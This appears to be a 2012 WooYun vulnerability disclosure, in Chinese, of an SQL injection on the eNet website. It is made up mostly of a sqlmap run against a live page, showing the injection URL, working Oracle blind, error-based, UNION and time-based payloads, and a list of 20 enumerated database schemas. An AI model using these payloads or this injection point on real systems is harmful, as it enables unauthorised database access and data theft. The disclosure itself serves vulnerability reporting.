wybug_title: eNet硅谷动力网站- SQL注入漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2012-05-13：	积极联系厂商并且等待厂商认领中，细节不对外公开									2012-06-27：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： eNet硅谷动力网站- SQL注入漏洞作者：眼神 详细说明：  注入点 http://www.enet.com.cn/enews/inforcenter/itdate/itdate.jsp?id=2root@bt:/pentest/database/sqlmap# python sqlmap.py -u "http://www.enet.com.cn/enews/inforcenter/itdate/itdate.jsp?id=2" --dbs -v 0    sqlmap/1.0-dev (r4766) - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 12:14:24[12:14:24] [INFO] using '/pentest/database/sqlmap/output/www.enet.com.cn/session' as session file[12:14:24] [INFO] resuming injection data from session file[12:14:24] [INFO] resuming back-end DBMS 'oracle' from session file[12:14:24] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=2 AND 5086=5086    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: id=2 AND 4513=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(111)||CHR(117)||CHR(107)||CHR(58)||(SELECT (CASE WHEN (4513=4513) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(109)||CHR(103)||CHR(111)||CHR(58)||CHR(62))) FROM DUAL)    Type: UNION query    Title: Generic UNION query (NULL) - 19 columns    Payload: id=2 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CHR(58)||CHR(111)||CHR(117)||CHR(107)||CHR(58)||CHR(100)||CHR(113)||CHR(112)||CHR(68)||CHR(103)||CHR(116)||CHR(74)||CHR(89)||CHR(118)||CHR(85)||CHR(58)||CHR(109)||CHR(103)||CHR(111)||CHR(58), NULL, NULL, NULL, NULL, NULL, NULL FROM DUAL--     Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: id=2 AND 7327=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(67)||CHR(101)||CHR(103),5)---[12:14:25] [INFO] the back-end DBMS is Oracleweb application technology: Apache, JSPback-end DBMS: Oracle[12:14:25] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[12:14:25] [INFO] fetching database (schema) namesavailable databases [20]:[*] ADV[*] ARTICLE_COMMENT[*] B2B_ADMIN[*] DBSNMP[*] EKA[*] FASHION[*] FILTER_ADMIN[*] IDC[*] IFLOW_ADMIN[*] IFLOW_ENEWS[*] OUTLN[*] PASS[*] PDB_ADMIN[*] ROBOT[*] SHOW[*] SYS[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XPDB_ADMIN[12:14:25] [INFO] Fetched data logged to text files under '/pentest/database/sqlmap/output/www.enet.com.cn'[*] shutting down at 12:14:25   漏洞证明：
